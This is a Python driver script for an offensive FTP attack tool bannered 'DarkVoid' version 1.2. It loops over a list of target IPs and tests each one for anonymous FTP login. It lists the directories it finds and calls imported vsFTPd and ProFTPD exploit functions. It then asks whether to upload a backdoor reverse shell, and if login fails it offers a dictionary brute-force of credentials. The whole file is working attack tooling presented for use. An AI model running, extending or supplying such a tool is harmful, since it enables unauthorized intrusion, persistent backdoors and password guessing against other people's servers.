
import ftplib
from ftplib import FTP
from colorama import Fore
import os,sys,socket
from exploit import vsFTP_exploit,proFTP_133c,ReverseShell,vuln,vuln_backdoor,proFTP_132rc3
from Brute import is_correct
from HTTP import web_request

print(Fore.MAGENTA + """
████████▄     ▄████████    ▄████████    ▄█   ▄█▄       ▄█    █▄   ▄██████▄   ▄█  ████████▄  
███   ▀███   ███    ███   ███    ███   ███ ▄███▀      ███    ███ ███    ███ ███  ███   ▀███ 
███    ███   ███    ███   ███    ███   ███▐██▀        ███    ███ ███    ███ ███▌ ███    ███ 
███    ███   ███    ███  ▄███▄▄▄▄██▀  ▄█████▀         ███    ███ ███    ███ ███▌ ███    ███ 
███    ███ ▀███████████ ▀▀███▀▀▀▀▀   ▀▀█████▄         ███    ███ ███    ███ ███▌ ███    ███ 
███    ███   ███    ███ ▀███████████   ███▐██▄        ███    ███ ███    ███ ███  ███    ███ 
███   ▄███   ███    ███   ███    ███   ███ ▀███▄      ███    ███ ███    ███ ███  ███   ▄███ 
████████▀    ███    █▀    ███    ███   ███   ▀█▀       ▀██████▀   ▀██████▀  █▀   ████████▀  """ + Fore.CYAN + " Version 1.2\n" + Fore.RESET)

IP = open("Files/targets.txt").readlines()
users = open("Files/users.txt").read().split("\n")
passwords = users = open("Files/passwords.txt").read().split("\n")
Port = 21

print("[" + Fore.CYAN + 'Status' + Fore.RESET +  '] Hunting Targets...')

for i in IP:
    try:
        ftp = FTP()
        ftp.connect(host=i.strip('\n'),port=Port,timeout=10)
        result = ftp.login()
        #ftp.cwd('vulnerable')
        if '230' in result:
            print("[" + Fore.RED + "Connection Successful" + Fore.RESET + "] " + i.strip('\n'))
            print("[" + Fore.RED + "Vulnerable" + Fore.RESET + "]" + " Anonymous Logon Successful" + Fore.RESET)
            print("[" + Fore.CYAN + "Directories" + Fore.RESET + "] " +  str(ftp.retrlines("LIST")))
            web_request(i.strip("\n"))
            print("[" + Fore.CYAN + "Service Detection" + Fore.RESET + "]")
            print("    [" + Fore.CYAN + 'FTP Version' + Fore.RESET + "] " + ftp.getwelcome()[4:])
            vuln(i.strip('\n'),ftp,Port)
            upload = input("    [" + Fore.CYAN + "Question" + Fore.RESET + "] Try Uploading a Backdoor " + Fore.YELLOW + "Y/N " + Fore.RESET)
            if upload.upper() == "Y":
                ReverseShell(ftp,i.strip("\n"))
    except socket.timeout:
        print("[" + Fore.CYAN + "Timeout" + Fore.RESET + "] " + i.strip('\n') + Fore.YELLOW + " May Be Blocked by Server" + Fore.RESET)
        pass
    except OSError:
        print("[" + Fore.CYAN + "Host" + Fore.RESET + "] " + i.strip('\n') + Fore.YELLOW + " Not Found" + Fore.RESET)
        
    except:
        os.system('clear')
        print(Fore.MAGENTA + """
████████▄     ▄████████    ▄████████    ▄█   ▄█▄       ▄█    █▄   ▄██████▄   ▄█  ████████▄  
███   ▀███   ███    ███   ███    ███   ███ ▄███▀      ███    ███ ███    ███ ███  ███   ▀███ 
███    ███   ███    ███   ███    ███   ███▐██▀        ███    ███ ███    ███ ███▌ ███    ███ 
███    ███   ███    ███  ▄███▄▄▄▄██▀  ▄█████▀         ███    ███ ███    ███ ███▌ ███    ███ 
███    ███ ▀███████████ ▀▀███▀▀▀▀▀   ▀▀█████▄         ███    ███ ███    ███ ███▌ ███    ███ 
███    ███   ███    ███ ▀███████████   ███▐██▄        ███    ███ ███    ███ ███  ███    ███ 
███   ▄███   ███    ███   ███    ███   ███ ▀███▄      ███    ███ ███    ███ ███  ███   ▄███ 
████████▀    ███    █▀    ███    ███   ███   ▀█▀       ▀██████▀   ▀██████▀  █▀   ████████▀    """ + Fore.CYAN + " Version 1.2\n" + Fore.RESET)
        print("[" + Fore.RED + "Failed" + Fore.RESET + "] Anonymous login not allowed or no write permissions")
        print("[" + Fore.CYAN + 'Target' + Fore.RESET + '] ' + i.strip('\n'))
        web_request(i.strip("\n"))
        print("[" + Fore.CYAN + "FTP Version" + Fore.RESET + "]")
        vuln_backdoor(i.strip('\n'),ftp,Port)
        round2 = input("    [" + Fore.CYAN + "Question" + Fore.RESET + "] Stop Exploitation " + Fore.YELLOW + "Y/N " + Fore.RESET)
        if round2.upper() == "Y":
            os.system("clear")
            print("[" + Fore.CYAN + "Quiting" + Fore.RESET + "] Goodbye")
        else:
            brute = input("    [" + Fore.CYAN + 'Question' + Fore.RESET + "] Start Bruteforce Attack " + Fore.YELLOW + "Y/N " + Fore.RESET + "(Warning Very Noisy!) " + Fore.RESET)
            if brute.upper() == "Y":
                print("[" + Fore.CYAN + "Bruteforcing Credentials" + Fore.RESET + "]")
                print("[" + Fore.CYAN + "Users to Try" + Fore.RESET + "]" ,len(users))
                print("[" + Fore.CYAN + "Passwords to Try" + Fore.RESET + "]" ,len(passwords))
                print("[" + Fore.CYAN + "Login Attempts" + Fore.RESET + "]" ,len(users) * len(passwords))
                for user in users:
                    for password in passwords:
                        if is_correct(user,password,i.strip("\n"),Port):
                            break
                
